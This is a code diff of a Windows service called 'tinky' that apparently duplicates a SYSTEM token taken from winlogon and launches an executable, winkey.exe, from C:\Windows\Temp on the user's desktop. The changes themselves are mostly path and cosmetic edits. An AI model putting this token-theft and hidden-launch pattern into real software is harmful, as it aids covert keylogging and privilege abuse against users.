@@ -12,6 +12,7 @@
 #include <cwchar>
 #include <cstdio>
 #include <iostream>
+#include <tlhelp32.h>
 
 #define SVCNAME L"tinky"
 
@@ -31,7 +32,6 @@ void SvcReportEvent(const wchar_t *);
 void LogEvent(const wchar_t *);
 
 // TOKEN IMPERSONATION*************************
-#include <tlhelp32.h>
 
 HANDLE GetSystemTokenFromWinlogon()
 {
@@ -184,17 +184,17 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
         return;
     }
 
-    // TO_DO: Perform work until service stops.
-
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
-    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
+    si.lpDesktop = L"WinSta0\\Default";
 
     PROCESS_INFORMATION pi;
 
+    // path is in temp because we can't get the working directory of the project
+    // here our current directory is C:\\system32
     BOOL bResult = CreateProcessAsUserW(
         hTokenDup,
-        L"C:\\vagrant\\src\\winkey.exe",
+        L"C:\\Windows\\Temp\\winkey.exe",
         nullptr,
         nullptr,
         nullptr,
@@ -212,7 +212,7 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
         swprintf_s(buf, L"Failed to create, GetLastError=%lu", GetLastError());
         LogEvent(buf);
     }
-    // Save the process handler to kill it if we stop
+    // Save the process handler to kill it when stopping
     hwinkey = pi.hProcess;
 
     int counter = 0;
@@ -301,7 +301,6 @@ VOID ReportSvcStatus(DWORD dwCurrentState,
 VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
 {
     // Handle the requested control code.
-
     if (dwCtrl == SERVICE_CONTROL_STOP)
     {
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
@@ -313,7 +312,6 @@ VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
             hwinkey = nullptr;
         }
         // Signal the service to stop.
-
         SetEvent(ghSvcStopEvent);
         ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
     }
@@ -375,7 +373,7 @@ int wmain()
 {
     SERVICE_TABLE_ENTRYW table[] =
         {
-            {(LPWSTR)L"tinky", SvcMain},
+            {L"tinky", SvcMain},
             {nullptr, nullptr}};
 
     StartServiceCtrlDispatcherW(table);
